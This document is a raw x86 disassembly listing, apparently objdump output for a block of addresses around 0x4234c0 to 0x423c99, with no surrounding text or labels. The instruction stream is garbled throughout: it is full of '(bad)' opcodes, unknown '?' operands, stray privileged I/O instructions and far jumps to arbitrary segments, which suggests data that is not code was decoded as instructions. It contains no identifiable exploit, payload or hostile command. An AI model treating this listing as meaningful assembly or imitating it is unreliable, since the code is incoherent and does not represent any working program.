  4234c0:	xchg   ecx,eax
  4234c1:	sub    al,0xe3
  4234c3:	call   0x7ed1:0xf614b61
  4234ca:	(bad)  
  4234cb:	jmp    0x42353c
  4234cd:	scas   eax,DWORD PTR es:[edi]
  4234ce:	arpl   bx,ax
  4234d0:	xor    cl,BYTE PTR [edi+0x15]
  4234d3:	es push ss
  4234d5:	adc    eax,0x33521e
  4234da:	mov    cl,BYTE PTR [edx-0x27]
  4234dd:	mov    ebx,0xd82e2cdc
  4234e2:	(bad)  
  4234e3:	sub    DWORD PTR [ecx-0x17],ecx
  4234e6:	jp     0x423549
  4234e8:	push   DWORD PTR [edi-0x2bc18f63]
  4234ee:	mov    bh,0x85
  4234f0:	push   eax
  4234f1:	dec    edi
  4234f2:	in     eax,dx
  4234f3:	dec    edx
  4234f4:	lds    eax,FWORD PTR [edx+0x2864bdf2]
  4234fa:	push   es
  4234fb:	cmp    dh,ah
  4234fd:	in     al,dx
  4234fe:	test   al,0xbf
  423500:	fidivr WORD PTR [edi+0x3f]
  423503:	ss lock push eax
  423506:	ins    DWORD PTR es:[edi],dx
  423507:	mov    dl,0x31
  423509:	xor    eax,0x7b2b8e3f
  42350e:	xor    esp,esp
  423510:	push   edx
  423511:	mov    esi,0x1cde1453
  423516:	mov    BYTE PTR fs:[esi-0x2b],bh
  42351a:	fstp   st(7)
  42351c:	sub    eax,0x303e33b9
  423521:	xchg   ebp,eax
  423522:	xchg   ebx,eax
  423523:	test   DWORD PTR [edi+ebp*2],edx
  423526:	mov    ah,ah
  423528:	mov    ds:0xb6b3eb50,al
  42352d:	das    
  42352e:	add    dh,BYTE PTR [edx+0x42]
  423531:	stos   DWORD PTR es:[edi],eax
  423532:	test   DWORD PTR cs:[edx],ebp
  423535:	xor    eax,0xb3887b3e
  42353a:	fcom   DWORD PTR [ecx+0x4a56bfbc]
  423540:	in     al,0x4d
  423542:	cmp    cl,ah
  423544:	dec    ecx
  423545:	pop    eax
  423546:	pop    ebp
  423547:	push   ebx
  423548:	mov    ss,WORD PTR [ebp+0x4f42ca10]
  42354e:	mov    cl,0xc6
  423550:	and    DWORD PTR [esi+0x1d],esi
  423553:	and    al,0xcf
  423555:	push   esp
  423556:	push   0x6ad21349
  42355b:	jno    0x423540
  42355d:	sbb    DWORD PTR [edi+0x10],esi
  423560:	and    al,BYTE PTR [esi-0x49b9f183]
  423566:	cli    
  423567:	in     eax,0x8b
  423569:	sbb    ebp,DWORD PTR [edi+0x65abcc7]
  42356f:	fwait
  423570:	and    edx,DWORD PTR [ecx+0xe7fba8e]
  423576:	inc    esi
  423577:	jns    0x4235e1
  423579:	mov    DWORD PTR [ebp-0x35c06e33],esp
  42357f:	jge    0x4235c8
  423581:	stos   DWORD PTR es:[edi],eax
  423582:	cld    
  423583:	ret    0xdb86
  423586:	test   al,0x5d
  423588:	loopne 0x423569
  42358a:	xchg   edx,eax
  42358b:	aas    
  42358c:	test   eax,0x2dc0f3a
  423591:	daa    
  423592:	xchg   ebx,eax
  423593:	int    0xd9
  423595:	test   dl,ah
  423597:	daa    
  423598:	clc    
  423599:	shl    DWORD PTR [ebp-0x23],1
  42359c:	mov    ds:0x1aa2fff7,eax
  4235a1:	iret   
  4235a2:	icebp  
  4235a3:	mov    BYTE PTR [ebp-0x26b93ef3],ch
  4235a9:	sub    al,BYTE PTR [eax]
  4235ab:	cmc    
  4235ac:	adc    eax,0x76609339
  4235b1:	dec    edx
  4235b2:	leave  
  4235b3:	rcl    BYTE PTR [edi-0x49],1
  4235b6:	adc    eax,0xd0540c49
  4235bb:	popf   
  4235bc:	pop    esi
  4235bd:	fmul   QWORD PTR [edi+0x26]
  4235c0:	push   eax
  4235c1:	(bad)  [eax+0x3a]
  4235c4:	dec    esp
  4235c5:	mov    dh,0xb7
  4235c7:	mov    eax,ds:0x5cb6d9cc
  4235cc:	add    dh,BYTE PTR [ebx+0x78]
  4235cf:	mov    ds:0xad021641,eax
  4235d4:	test   eax,0x18e4d5e0
  4235d9:	stos   BYTE PTR es:[edi],al
  4235da:	sub    ebx,DWORD PTR [ecx-0x34a516c7]
  4235e0:	sub    BYTE PTR [bx-0x75],0x69
  4235e5:	dec    ebx
  4235e6:	neg    DWORD PTR [edx]
  4235e8:	push   es
  4235e9:	dec    edi
  4235ea:	inc    eax
  4235eb:	pusha  
  4235ec:	aaa    
  4235ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235f0:	je     0x423574
  4235f2:	mov    esi,0x8699315f
  4235f7:	in     eax,dx
  4235f8:	dec    ebx
  4235f9:	loope  0x423585
  4235fb:	mov    edx,0x53cfdd8a
  423600:	mov    ch,0x8d
  423602:	jns    0x4235fb
  423604:	xchg   ebp,eax
  423605:	sub    BYTE PTR [edx+0x3a],al
  423608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423609:	xchg   esp,eax
  42360a:	dec    eax
  42360b:	and    esi,edx
  42360d:	popa   
  42360e:	imul   esp,esp,0xffffffa7
  423611:	scas   al,BYTE PTR es:[edi]
  423612:	xchg   bl,bl
  423614:	data16 fcom DWORD PTR [esi-0xd3b06db]
  42361b:	inc    ebp
  42361c:	mov    ah,0x31
  42361e:	or     DWORD PTR [edx],0x71
  423621:	cli    
  423622:	cmp    ah,BYTE PTR [ebx-0x11]
  423625:	shr    BYTE PTR [edx],0xfb
  423628:	mov    al,ah
  42362a:	sahf   
  42362b:	jne    0x4236ab
  42362d:	imul   eax,DWORD PTR [ebx-0x3dd4cf16],0xbecb8322
  423637:	jb     0x423693
  423639:	push   esp
  42363a:	xchg   ecx,eax
  42363b:	add    al,0xa9
  42363d:	xchg   edx,eax
  42363e:	in     eax,0xad
  423640:	mov    ds,edx
  423642:	retf   
  423643:	cmp    BYTE PTR [edi+ebx*2-0x7],bh
  423647:	inc    ebx
  423648:	push   ecx
  423649:	test   eax,0xd16ca79
  42364e:	js     0x42367d
  423650:	jnp    0x423612
  423652:	lds    ebp,FWORD PTR ds:0x976a1d06
  423658:	lea    edi,[edx+0x5d]
  42365b:	mov    edi,0x6f03e81f
  423660:	add    DWORD PTR [edx+0x1e],edi
  423663:	and    dh,bl
  423665:	in     al,0x36
  423667:	in     eax,0xac
  423669:	jp     0x42362b
  42366b:	call   FWORD PTR [esi]
  42366d:	mov    ?,WORD PTR [ebx-0x41]
  423670:	inc    esi
  423671:	inc    ebp
  423672:	into   
  423673:	cld    
  423674:	ret    0xf555
  423677:	add    dl,BYTE PTR ds:0x545a4d82
  42367d:	xor    bl,BYTE PTR [esi+0x6d]
  423680:	aas    
  423681:	dec    edx
  423682:	outs   dx,BYTE PTR ds:[esi]
  423683:	pop    ebp
  423684:	cmp    eax,0xad73761c
  423689:	outs   dx,BYTE PTR ds:[esi]
  42368a:	adc    esp,DWORD PTR [ecx+0x272982f6]
  423690:	or     BYTE PTR [ebp-0x16],dh
  423693:	das    
  423694:	xor    cl,0x8
  423697:	imul   esi,DWORD PTR [edx-0x1e],0x21f88b3d
  42369e:	iret   
  42369f:	jnp    0x423644
  4236a1:	lock dec ebp
  4236a3:	add    ah,BYTE PTR [eax+0xb36a7dc]
  4236a9:	pop    ebp
  4236aa:	imul   edx,DWORD PTR [eax+0x61],0xffffffe0
  4236ae:	push   edi
  4236af:	test   BYTE PTR [ecx+0x1b],dl
  4236b2:	scas   al,BYTE PTR es:[edi]
  4236b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236b4:	xlat   BYTE PTR ds:[ebx]
  4236b5:	imul   edx
  4236b7:	call   0x2b755caa
  4236bc:	or     eax,0xdffab6c2
  4236c1:	(bad)  
  4236c2:	adc    eax,DWORD PTR [edi]
  4236c4:	lods   al,BYTE PTR ds:[esi]
  4236c5:	push   esp
  4236c6:	xor    eax,0x67cee9e1
  4236cb:	out    dx,al
  4236cc:	pop    es
  4236cd:	popa   
  4236ce:	push   edx
  4236cf:	in     al,0x9b
  4236d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236d2:	pusha  
  4236d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236d4:	push   eax
  4236d5:	adc    edi,DWORD PTR [esi]
  4236d7:	jmp    0x6cfe2627
  4236dc:	fist   DWORD PTR [ebx]
  4236de:	lea    esi,[esi-0x32]
  4236e1:	or     bl,dh
  4236e3:	pop    edi
  4236e4:	xor    eax,0x6983de46
  4236e9:	ins    DWORD PTR es:[di],dx
  4236eb:	mov    esp,0x950bedfc
  4236f0:	pop    ss
  4236f1:	push   ss
  4236f2:	xor    DWORD PTR [eax-0x398a7cd0],ebp
  4236f8:	in     eax,dx
  4236f9:	push   esi
  4236fa:	add    al,BYTE PTR [esi+0x35]
  4236fd:	push   esp
  4236fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236ff:	mov    ecx,0x6f986117
  423704:	jnp    0x423694
  423706:	mov    esi,0x3e117156
  42370b:	stos   BYTE PTR es:[edi],al
  42370c:	out    0xa9,al
  42370e:	fwait
  42370f:	push   esp
  423710:	pop    ds
  423711:	aam    0x23
  423713:	jp     0x423714
  423715:	mov    BYTE PTR [edx+0x6b],bl
  423718:	push   ecx
  42371a:	and    eax,0x5e7b8baa
  42371f:	push   ds
  423720:	add    esp,edx
  423722:	jle    0x42377c
  423724:	mov    ds:0x44e1a0f8,eax
  423729:	xor    al,0x9f
  42372b:	xchg   edi,eax
  42372c:	sub    eax,0x11501730
  423731:	cmp    al,0xbc
  423733:	(bad)  [esi+0x1e]
  423736:	add    BYTE PTR [esi+ebp*2],0xeb
  42373a:	adc    eax,0x8ac38935
  42373f:	sbb    DWORD PTR [ebp-0x5b46c185],ebp
  423745:	jmp    0x992a:0x5d9b2a1e
  42374c:	and    DWORD PTR ds:0x15a3f405,ebx
  423752:	fmul   QWORD PTR [eax-0x50d4fba4]
  423758:	push   0xffffffc6
  42375a:	cmp    eax,0x7d22b497
  42375f:	lock mov bl,0x6d
  423762:	cmp    DWORD PTR [edx+0x44ebd361],edx
  423768:	test   eax,0x4bdbd49e
  42376d:	popf   
  42376e:	mov    BYTE PTR [ebp+esi*2-0x60],0xd9
  423773:	pop    ecx
  423774:	call   0x3611:0x231d2ab8
  42377b:	lock mov edi,0x15521833
  423781:	hlt    
  423782:	out    dx,al
  423783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423784:	arpl   WORD PTR [ebx],bx
  423786:	test   eax,0x6ba50da
  42378b:	push   esp
  42378c:	pop    edi
  42378d:	lods   al,BYTE PTR ds:[esi]
  42378e:	ins    BYTE PTR es:[edi],dx
  42378f:	enter  0xb2d0,0x35
  423793:	cmp    cl,dl
  423795:	int    0x74
  423797:	retf   0x3c4d
  42379a:	stos   DWORD PTR es:[edi],eax
  42379b:	(bad)  
  42379c:	jle    0x4237ff
  42379e:	pop    ds
  42379f:	and    al,0xa7
  4237a1:	mov    ss,WORD PTR [ecx+0x7c93c555]
  4237a7:	pop    es
  4237a8:	rol    BYTE PTR [edx+0x30],0x7d
  4237ac:	sbb    DWORD PTR [eax+0x68],ecx
  4237af:	mov    ebx,0x27f7078e
  4237b4:	iret   
  4237b5:	mov    edx,0x423e2874
  4237ba:	shr    ch,0x48
  4237bd:	test   al,0x1b
  4237bf:	push   ebx
  4237c0:	xchg   BYTE PTR [ebx+0x4693c5c6],bl
  4237c6:	inc    ebx
  4237c7:	mov    eax,ds:0x7b1629a9
  4237cc:	lds    ebp,FWORD PTR [ebp+0x46]
  4237cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237d0:	mov    eax,0xf6a8a7bd
  4237d5:	outs   dx,DWORD PTR ds:[esi]
  4237d6:	cmc    
  4237d7:	push   ebx
  4237d8:	inc    ecx
  4237d9:	jp     0x423761
  4237db:	push   ebx
  4237dc:	and    al,cl
  4237de:	xor    BYTE PTR [ebx-0x70],dl
  4237e1:	jo     0x4237c0
  4237e3:	js     0x423822
  4237e5:	iret   
  4237e6:	add    esi,ebx
  4237e8:	test   BYTE PTR [edx-0x38673e74],ah
  4237ee:	shl    BYTE PTR [eax-0x775fc02d],cl
  4237f4:	fstp   TBYTE PTR [esp+edi*8-0x685c738e]
  4237fb:	pop    ds
  4237fc:	mov    cl,0x90
  4237fe:	in     al,dx
  4237ff:	mov    ebx,0x9babbbc3
  423805:	push   ebx
  423806:	fcom   st(6)
  423808:	dec    edi
  423809:	mov    ?,esp
  42380b:	cdq    
  42380c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42380d:	pop    ecx
  42380e:	scas   eax,DWORD PTR es:[edi]
  42380f:	push   ds
  423810:	mov    ebp,0x3adf0a5c
  423815:	push   edi
  423816:	ss sub edx,ecx
  423819:	popa   
  42381a:	(bad)  
  42381b:	mov    eax,0x29bd98c6
  423820:	jmp    0x7ed7:0x4490fa62
  423827:	stos   DWORD PTR es:[edi],eax
  423828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423829:	aad    0xc0
  42382b:	ins    DWORD PTR es:[edi],dx
  42382c:	in     eax,0x4a
  42382e:	cdq    
  42382f:	jp     0x423874
  423831:	push   edi
  423832:	inc    ebp
  423833:	xchg   bh,al
  423835:	mov    ecx,0x4ebaf39a
  42383a:	push   edx
  42383b:	xchg   esi,eax
  42383c:	ds sahf 
  42383e:	or     esi,DWORD PTR [ecx]
  423840:	stos   DWORD PTR es:[edi],eax
  423841:	cwde   
  423842:	imul   eax,eax,0xe
  423845:	mov    cl,0x16
  423847:	inc    eax
  423848:	popf   
  423849:	pop    esi
  42384a:	mov    dl,0x98
  42384c:	pop    ebp
  42384d:	pop    ss
  42384e:	stos   DWORD PTR es:[edi],eax
  42384f:	data16 jge 0x423846
  423852:	sub    al,0x22
  423854:	sub    eax,0xa2fce863
  423859:	push   ebp
  42385a:	pop    eax
  42385b:	xchg   ecx,eax
  42385c:	mov    dh,0xaf
  42385e:	xchg   BYTE PTR [ecx],cl
  423860:	fadd   DWORD PTR [eax+edi*4]
  423863:	enter  0xbc4e,0xd8
  423867:	sub    DWORD PTR [eax+0x17],0x64
  42386b:	cmp    eax,eax
  42386d:	popf   
  42386e:	ja     0x423859
  423870:	popa   
  423871:	adc    dh,ch
  423873:	retf   
  423874:	cmp    BYTE PTR [edi],0x2a
  423877:	push   eax
  423878:	jbe    0x423896
  42387a:	pop    es
  42387b:	idiv   ebp
  42387d:	popf   
  42387e:	retf   
  42387f:	outs   dx,BYTE PTR ds:[esi]
  423880:	jge    0x423831
  423882:	jo     0x4238e4
  423884:	in     eax,0x41
  423886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423887:	jle    0x423824
  423889:	cmp    eax,0xf04f6f3b
  42388e:	shl    DWORD PTR [esi-0x17],0x0
  423892:	or     DWORD PTR [esi-0x739502ab],esp
  423898:	mov    eax,ds:0xb09a8392
  42389d:	add    edx,DWORD PTR [ecx-0x52]
  4238a0:	mov    eax,0x644a3e07
  4238a5:	push   cs
  4238a6:	push   0xb397c0a5
  4238ab:	jnp    0x423839
  4238ad:	int3   
  4238ae:	adc    ah,BYTE PTR [ebx+ebp*2-0x35197753]
  4238b5:	lea    eax,[edx-0x1c]
  4238b8:	stc    
  4238b9:	hlt    
  4238ba:	das    
  4238bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238bc:	scas   al,BYTE PTR es:[edi]
  4238bd:	arpl   WORD PTR gs:[ecx+edx*4-0x45],bx
  4238c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238c3:	adc    eax,0xae9fbbc2
  4238c8:	jecxz  0x42391e
  4238ca:	pushf  
  4238cb:	cmp    dh,BYTE PTR [ebx-0x7]
  4238ce:	and    esi,DWORD PTR [ebp+0x26]
  4238d1:	mov    dl,0x7a
  4238d3:	dec    eax
  4238d4:	xor    eax,0x86711cd9
  4238d9:	(bad)  [eax+0x77854e2d]
  4238df:	int    0x14
  4238e1:	push   cs
  4238e2:	stc    
  4238e3:	push   edx
  4238e4:	jne    0x4238fd
  4238e6:	sub    eax,0xe4b05de7
  4238eb:	jl     0x423936
  4238ed:	sub    eax,DWORD PTR [ecx]
  4238ef:	xchg   edx,eax
  4238f0:	pop    esi
  4238f1:	adc    dh,BYTE PTR [edx+eax*1+0x41f6c0e]
  4238f8:	in     al,dx
  4238f9:	inc    edi
  4238fa:	imul   edx,DWORD PTR cs:[eax+0x23430975],0x2de546be
  423905:	nop
  423906:	in     al,0xe0
  423908:	push   edx
  423909:	ret    0x3be7
  42390c:	fld    TBYTE PTR ds:0x5f9cd843
  423912:	sub    eax,0xe4619712
  423917:	or     al,0xe2
  423919:	ja     0x423997
  42391b:	push   0x12ef44e3
  423920:	cmp    BYTE PTR [eax+edx*4],bh
  423923:	mov    al,0xa2
  423925:	test   eax,0xe11ba4f8
  42392a:	out    0x4,eax
  42392c:	js     0x423977
  42392e:	sub    DWORD PTR [edi],0x2621b532
  423934:	fisttp DWORD PTR [ebp+0xc]
  423937:	mov    ah,dl
  423939:	mov    dh,0x6b
  42393b:	stos   BYTE PTR es:[edi],al
  42393c:	inc    esp
  42393d:	nop
  42393e:	stos   DWORD PTR es:[edi],eax
  42393f:	xchg   ebp,eax
  423940:	xor    esp,DWORD PTR [edi]
  423942:	fldenv [ecx+0x57]
  423945:	icebp  
  423946:	cmp    eax,0x445a4bc8
  42394b:	stos   BYTE PTR es:[edi],al
  42394c:	sahf   
  42394d:	call   0x6487:0x5f721fae
  423954:	fst    DWORD PTR [eax-0x46d7e0ec]
  42395a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42395b:	cmp    ecx,eax
  42395d:	or     eax,0xd3e7d4d7
  423962:	ret    0xb436
  423965:	lods   al,BYTE PTR ds:[esi]
  423966:	push   ss
  423967:	dec    esi
  423968:	scas   eax,DWORD PTR es:[edi]
  423969:	and    edi,edx
  42396b:	in     al,0x1e
  42396d:	mov    cl,0xd9
  42396f:	aaa    
  423970:	icebp  
  423971:	sub    ah,BYTE PTR [edx-0x6f]
  423974:	jmp    0x9229cbc8
  423979:	mov    ecx,?
  42397b:	push   eax
  42397c:	sbb    al,0x2a
  42397e:	pop    ds
  42397f:	xchg   ecx,eax
  423980:	sahf   
  423981:	push   edi
  423982:	xchg   esp,eax
  423983:	into   
  423984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423985:	stos   BYTE PTR es:[edi],al
  423986:	xor    ecx,DWORD PTR ds:0x5b957815
  42398c:	xor    ch,ah
  42398e:	daa    
  42398f:	(bad)  
  423990:	fidiv  DWORD PTR [esi+0x6c8cd51]
  423996:	sbb    dl,ch
  423998:	cmp    BYTE PTR [edx-0x76514d53],dh
  42399e:	fsub   DWORD PTR [ebx-0x7baa68cf]
  4239a4:	jecxz  0x4239e2
  4239a6:	mov    dl,0x62
  4239a8:	sbb    DWORD PTR [esi],esi
  4239aa:	inc    edi
  4239ab:	cmp    BYTE PTR ds:0xa9052cee,al
  4239b1:	int3   
  4239b2:	jp     0x4239e0
  4239b4:	(bad)  
  4239b5:	cli    
  4239b6:	mov    ecx,0x6439de04
  4239bb:	add    eax,0x4949bebb
  4239c0:	jne    0x423a28
  4239c2:	pushf  
  4239c3:	add    ch,BYTE PTR ss:[eax+0x36ca4712]
  4239ca:	les    edx,FWORD PTR [ebx+0x2b]
  4239cd:	shr    DWORD PTR [eax],1
  4239cf:	mov    edx,0x889177f8
  4239d4:	adc    DWORD PTR [eax],0x6e14d305
  4239da:	sbb    al,al
  4239dc:	pop    esp
  4239dd:	popf   
  4239de:	ficom  DWORD PTR [eax-0x46809167]
  4239e4:	and    eax,0x336bf17c
  4239e9:	push   es
  4239ea:	out    0x95,al
  4239ec:	pop    esi
  4239ed:	repz add BYTE PTR [ecx-0x37aa8baf],0x2b
  4239f5:	fdivr  DWORD PTR [edi-0x16]
  4239f8:	mov    edi,0xae2d587b
  4239fd:	fs loopne 0x4239a3
  423a00:	call   0x663bc971
  423a05:	or     DWORD PTR [ebx-0x3c],ebp
  423a08:	leave  
  423a09:	mov    esi,0x7dd2e38f
  423a0e:	adc    cl,BYTE PTR [edx]
  423a10:	std    
  423a11:	aad    0x3c
  423a13:	(bad)  
  423a14:	int    0x5a
  423a16:	out    dx,eax
  423a17:	mov    esi,0x3c523f81
  423a1c:	loopne 0x423a7d
  423a1e:	in     al,dx
  423a1f:	leave  
  423a20:	lahf   
  423a21:	push   edx
  423a22:	std    
  423a23:	or     ebp,DWORD PTR [edx]
  423a25:	(bad)  
  423a26:	cmp    eax,0x6e6190e
  423a2b:	rcr    DWORD PTR [eax],cl
  423a2d:	shr    DWORD PTR [ecx-0x5b656d2b],cl
  423a33:	mov    dl,0x45
  423a35:	push   esi
  423a36:	and    bh,BYTE PTR [ebp+0x10]
  423a39:	retf   0x6b17
  423a3c:	repz or DWORD PTR [ebx],0x1629b3b5
  423a43:	nop
  423a44:	lods   al,BYTE PTR ds:[esi]
  423a45:	ret    0x1997
  423a48:	std    
  423a49:	mov    ch,0x8b
  423a4b:	out    0x2a,al
  423a4d:	cmp    al,0x56
  423a4f:	loop   0x423abb
  423a51:	test   BYTE PTR [eax+0x5d],ch
  423a54:	and    bh,ah
  423a56:	mov    ecx,0xb6e3c9ab
  423a5b:	mov    ch,0xb8
  423a5d:	mov    ebx,0x4a51991b
  423a62:	and    bh,dl
  423a64:	shl    DWORD PTR [edx+edi*4-0x32],cl
  423a68:	cmp    al,0x1f
  423a6a:	pop    edi
  423a6b:	dec    esp
  423a6c:	lods   eax,DWORD PTR ds:[esi]
  423a6d:	in     eax,dx
  423a6e:	cmp    ecx,ebp
  423a70:	mov    bl,0xbe
  423a72:	sbb    DWORD PTR [edi],esp
  423a74:	ret    0xaaff
  423a77:	mov    BYTE PTR [edi-0x23699ab0],bl
  423a7d:	mov    eax,0x3ae918d2
  423a82:	into   
  423a83:	push   0x28
  423a85:	clc    
  423a86:	add    ebx,0xfbd60f71
  423a8c:	mov    eax,ds:0x89ff5e0a
  423a91:	sbb    esi,DWORD PTR [ebx+0x5b8ce824]
  423a97:	mov    bh,0x6a
  423a99:	pop    ss
  423a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a9b:	ja     0x423a65
  423a9d:	stos   BYTE PTR es:[edi],al
  423a9e:	test   al,0xa
  423aa0:	sbb    DWORD PTR [eax+ebx*4+0x40],ecx
  423aa4:	cld    
  423aa5:	and    bl,BYTE PTR [esi-0x61]
  423aa8:	xor    eax,0x20804a67
  423aad:	xor    esp,esp
  423aaf:	sub    esp,edi
  423ab1:	lea    edi,[eax-0x25]
  423ab4:	call   0x915e:0x2e742579
  423abb:	push   cs
  423abc:	inc    eax
  423abd:	imul   edx,DWORD PTR [eax],0x8ec9c21d
  423ac3:	in     eax,0xd7
  423ac5:	inc    ecx
  423ac6:	xor    eax,0xf439068
  423acb:	addr16 mov esi,0xfd5c286a
  423ad1:	es jns 0x423b31
  423ad4:	pop    ecx
  423ad5:	inc    ecx
  423ad6:	or     bl,BYTE PTR [ecx+0x7]
  423ad9:	aam    0x55
  423adb:	in     al,0x2f
  423add:	leave  
  423ade:	enter  0xd583,0xeb
  423ae2:	mov    bh,0x35
  423ae4:	or     DWORD PTR [edi+ebp*2-0x5f],ebp
  423ae8:	outs   dx,DWORD PTR ds:[esi]
  423ae9:	push   ss
  423aea:	or     eax,0xb8e7d22d
  423aef:	jl     0x423a8b
  423af1:	pushf  
  423af2:	pop    esp
  423af3:	rcr    BYTE PTR [eax+edi*2-0x38],0x51
  423af8:	mov    al,ds:0xd7775201
  423afd:	cmp    dh,BYTE PTR [edx-0x6d95c74e]
  423b03:	cli    
  423b04:	cmp    BYTE PTR [edi+0x1e],0xcf
  423b08:	fstp   QWORD PTR [eax-0xba1c007]
  423b0e:	or     eax,0xa2fca406
  423b13:	sbb    edi,eax
  423b15:	(bad)  
  423b16:	cmc    
  423b17:	sub    al,al
  423b19:	add    ecx,DWORD PTR [ebp-0x283c030f]
  423b1f:	xor    BYTE PTR [esp+ecx*1-0x72],dl
  423b23:	xchg   edx,eax
  423b24:	pop    esi
  423b25:	push   eax
  423b26:	out    0x5f,al
  423b28:	in     al,0x60
  423b2a:	in     al,dx
  423b2b:	aad    0xec
  423b2d:	outs   dx,DWORD PTR ds:[esi]
  423b2e:	cmp    DWORD PTR [ecx+0x52],eax
  423b31:	sbb    DWORD PTR [ecx+0x394d72c7],edx
  423b37:	or     edi,DWORD PTR [edx]
  423b39:	call   0x18dbf018
  423b3e:	sbb    ecx,esi
  423b40:	mov    al,ds:0xd56442ba
  423b45:	push   edi
  423b46:	add    bh,BYTE PTR [eax+0x6d1d8ef0]
  423b4c:	inc    edi
  423b4d:	jmp    0xb61e86b7
  423b52:	mov    cl,0x9
  423b54:	fwait
  423b55:	(bad)  
  423b56:	mov    WORD PTR [ebx-0x168dcf8e],cs
  423b5c:	jecxz  0x423af6
  423b5e:	inc    esi
  423b5f:	and    DWORD PTR [edx],0x36
  423b62:	icebp  
  423b63:	sub    ebp,DWORD PTR ds:0xd2a84488
  423b69:	pop    ss
  423b6a:	(bad)  
  423b6b:	dec    ecx
  423b6c:	mov    bl,0x6b
  423b6e:	pop    edx
  423b6f:	sbb    al,0xb4
  423b71:	fst    DWORD PTR [edi+0x39329d7e]
  423b77:	xor    esi,eax
  423b79:	adc    esi,edx
  423b7b:	xchg   esi,eax
  423b7c:	mov    ebx,0x1a4fe412
  423b81:	or     dl,BYTE PTR [edx+0x3]
  423b84:	pop    ds
  423b85:	adc    al,0xfe
  423b87:	dec    ebx
  423b88:	daa    
  423b89:	inc    esi
  423b8a:	es adc eax,0xe1de795b
  423b90:	push   edi
  423b91:	cld    
  423b92:	sbb    BYTE PTR [ecx+0x6d66df3],0x81
  423b99:	(bad)  
  423b9b:	jg     0x423b75
  423b9d:	pop    esp
  423b9e:	jl     0x423b4e
  423ba0:	inc    ebp
  423ba1:	shl    DWORD PTR [eax-0x5f],cl
  423ba4:	xchg   esi,eax
  423ba5:	iret   
  423ba6:	aas    
  423ba7:	or     cl,0x37
  423baa:	jmp    0x786cea13
  423baf:	cmp    ecx,DWORD PTR [eax]
  423bb1:	not    DWORD PTR [edx+0x4a0224b8]
  423bb7:	retf   
  423bb8:	cmp    ecx,ebp
  423bba:	jb     0x423b79
  423bbc:	inc    BYTE PTR ds:0x700a3017
  423bc2:	jae    0x423b4d
  423bc4:	call   0xdfe47479
  423bc9:	push   edx
  423bca:	push   ss
  423bcb:	cs push cs
  423bcd:	xor    BYTE PTR [ebp+0x51],0xa4
  423bd1:	jle    0x423bc4
  423bd3:	pop    ebp
  423bd4:	mov    bl,0x3a
  423bd6:	jmp    0x423c07
  423bd8:	ret    
  423bd9:	adc    DWORD PTR [ecx-0x3],esi
  423bdc:	pop    esi
  423bdd:	xor    BYTE PTR [ecx],0x5d
  423be0:	mov    ebp,cs
  423be2:	xchg   ecx,eax
  423be3:	push   ds
  423be4:	or     al,0x11
  423be6:	mov    ?,esi
  423be8:	stos   BYTE PTR es:[edi],al
  423be9:	xlat   BYTE PTR ds:[ebx]
  423bea:	or     cl,cl
  423bec:	leave  
  423bed:	jg     0x423c63
  423bef:	aas    
  423bf0:	sub    eax,0x8564b053
  423bf5:	and    al,0xf2
  423bf7:	pop    ebx
  423bf8:	adc    BYTE PTR [ecx+ebp*4+0x5d],dl
  423bfc:	das    
  423bfd:	inc    ebp
  423bfe:	dec    esi
  423bff:	int    0x8d
  423c01:	test   DWORD PTR [ecx-0x3c628858],ebp
  423c07:	push   edx
  423c08:	jo     0x423bf8
  423c0a:	push   0x1fd48b1b
  423c0f:	int    0x3d
  423c11:	ret    
  423c12:	aad    0xda
  423c14:	ret    
  423c15:	adc    edi,DWORD PTR [esi]
  423c17:	jnp    0x423c5a
  423c19:	xor    al,0x76
  423c1b:	nop
  423c1c:	(bad)  
  423c1e:	int3   
  423c1f:	cld    
  423c20:	add    al,0x6a
  423c22:	ret    0xaa0
  423c25:	xor    ebp,ebp
  423c27:	pop    edx
  423c28:	das    
  423c29:	js     0x423bb7
  423c2b:	popf   
  423c2c:	xor    ch,dl
  423c2e:	push   es
  423c2f:	adc    esi,DWORD PTR [ecx-0x7c6566c6]
  423c35:	jg     0x423c8a
  423c37:	call   0xc1d3024f
  423c3c:	jb     0x423c3d
  423c3e:	mov    bh,0xcb
  423c40:	popf   
  423c41:	imul   BYTE PTR [edi]
  423c43:	fisttp DWORD PTR [ebp+0x22e17a4f]
  423c49:	mov    ds,WORD PTR [edx+ecx*4-0x48]
  423c4d:	add    BYTE PTR [ecx+0x5800ecf1],ch
  423c53:	sbb    al,0x71
  423c55:	ins    DWORD PTR es:[edi],dx
  423c56:	cmc    
  423c57:	outs   dx,DWORD PTR ds:[esi]
  423c58:	mov    al,ds:0x966f4b06
  423c5d:	mov    esp,0xbef000a4
  423c62:	cmp    BYTE PTR [ebx+0x1b],bh
  423c65:	data16 out dx,al
  423c67:	lahf   
  423c68:	cmp    eax,0x218ae054
  423c6d:	sbb    al,0x93
  423c6f:	dec    edi
  423c70:	cmp    DWORD PTR [ebp+ecx*1-0x4e0125fd],0xffffffaf
  423c78:	jmp    0x4b8eab24
  423c7d:	dec    ebp
  423c7e:	fiadd  WORD PTR gs:[ecx-0x228849cc]
  423c85:	jne    0x423cf3
  423c87:	push   ds
  423c88:	mov    WORD PTR [esi-0x2],ss
  423c8b:	mov    esp,0x6ba98391
  423c90:	and    eax,DWORD PTR [ebx-0xc]
  423c93:	add    BYTE PTR [eax-0x2f],0x17
  423c97:	pop    edx
  423c98:	dec    eax
  423c99:	dec    BYTE PTR [ebp-0x2d767ad]
